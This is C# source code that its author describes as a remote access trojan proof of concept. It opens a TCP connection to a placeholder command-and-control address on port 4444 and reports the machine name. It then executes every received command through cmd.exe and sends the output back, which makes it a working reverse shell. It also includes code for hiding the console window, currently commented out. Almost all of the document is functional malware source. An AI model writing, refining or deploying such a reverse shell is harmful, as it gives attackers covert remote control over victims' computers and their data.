//Author: Shaddy43
//Designation: Cybersecurity Engineer, reverse engineer and malware developer

//This program can be used as a remote access trojan which communicates on sockets and provides a reverse shell.
//The reverse shell listener could be a custom created server or even netcat.
//In this PoC, i've used netcat as a c2 server for my reverse shell.
//We can specify any ip address and port number for our c2 server in this program.
//I've setup a kali machine on my local network and used netcat to listen and pass commands to this reverse shell.
//However, this is not yet a true shell, because every command is executed in a different instance of cmd process. So commands like cd change directory doesn't work!!!
//Another limitation is that, it halts if we start another process and waits for that process to close. Need to fix that!!!

using System;
using System.Diagnostics;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Runtime.InteropServices;
using System.IO;

namespace NC_test
{
    class Program
    {

        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();

        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        const int SW_HIDE = 0;
        const int SW_SHOW = 5;

        static void Main(string[] args)
        {
            //var handle = GetConsoleWindow();

            //Hide
            //ShowWindow(handle, SW_HIDE);

            ExecuteClient();
        }


        static void ExecuteClient()
        {

            try
            {
                // Establish the remote endpoint 
                // for the socket. This example 
                // uses port 11111 on the local 
                // computer.
                //IPHostEntry ipHost = Dns.GetHostEntry(Dns.GetHostName());
                //IPAddress ipAddr = ipHost.AddressList[0];
                //IPEndPoint localEndPoint = new IPEndPoint(ipAddr, 11111);

                String ip = "C2.IP.ADDRESS.HERE";
                IPAddress ipAddr = IPAddress.Parse(ip);
                IPEndPoint localEndPoint = new IPEndPoint(ipAddr, 4444);

                // Creation TCP/IP Socket using 
                // Socket Class Constructor
                Socket sender = new Socket(ipAddr.AddressFamily,
                           SocketType.Stream, ProtocolType.Tcp);

                String cwd = Directory.GetCurrentDirectory();
                Console.WriteLine(cwd);

                try
                {

                    // Connect Socket to the remote 
                    // endpoint using method Connect()
                    sender.Connect(localEndPoint);

                    // We print EndPoint information 
                    // that we are connected
                    Console.WriteLine("Socket connected to -> {0} ",
                                  sender.RemoteEndPoint.ToString());

                    // Creation of messagge that
                    // we will send to Server
                    //byte[] messageSent = Encoding.ASCII.GetBytes("Client connected... <EOF>");
                    byte[] messageSent = Encoding.ASCII.GetBytes(System.Environment.MachineName+"\nPlease give your commands...\n");
                    int byteSent = sender.Send(messageSent);

                    // Data buffer
                    byte[] messageReceived = new byte[2048];

                    // We receive the messagge using 
                    // the method Receive(). This 
                    // method returns number of bytes
                    // received, that we'll use to 
                    // convert them to string

                    while (true)
                    {
                        int byteRecv = sender.Receive(messageReceived);
                        Console.WriteLine("Message from Server -> {0}",
                              Encoding.ASCII.GetString(messageReceived,
                                                         0, byteRecv));

                        string cmd_text = Encoding.ASCII.GetString(messageReceived, 0, byteRecv);
                        cmd_text = "/c " + cmd_text;
                        string output_string = "";
                        string output_string_error = "";
                        if (cmd_text != "")
                        {
                            // Start the child process.
                            Process p = new Process();
                            // Redirect the output stream of the child process.
                            p.StartInfo.UseShellExecute = false;
                            p.StartInfo.RedirectStandardOutput = true;
                            p.StartInfo.RedirectStandardError = true;
                            p.StartInfo.FileName = "cmd.exe";
                            p.StartInfo.Arguments = cmd_text;
                            p.Start();

                            output_string = p.StandardOutput.ReadToEnd();
                            output_string += "\n";
                            output_string_error = p.StandardError.ReadToEnd();
                            p.WaitForExit();

                            if (output_string_error != "")
                            {
                                output_string = output_string_error;
                            }

                            if (output_string == "" && output_string_error == "")
                            {
                                output_string = "command executed\n";
                            }
                        }

                        if (cmd_text.Contains("exit"))
                        {
                            break;
                        }

                        byte[] send_output = Encoding.ASCII.GetBytes(output_string);
                        int send_output_bytes = sender.Send(send_output);
                        output_string = "";
                        output_string_error = "";
                    }

                    // Close Socket using 
                    // the method Close()
                    sender.Shutdown(SocketShutdown.Both);
                    sender.Close();
                }

                // Manage of Socket's Exceptions
                catch (ArgumentNullException ane)
                {

                    Console.WriteLine("ArgumentNullException : {0}", ane.ToString());
                }

                catch (SocketException se)
                {

                    Console.WriteLine("SocketException : {0}", se.ToString());
                }

                catch (Exception e)
                {
                    Console.WriteLine("Unexpected exception : {0}", e.ToString());
                }
            }

            catch (Exception e)
            {

                Console.WriteLine(e.ToString());
            }
        }


    }
}
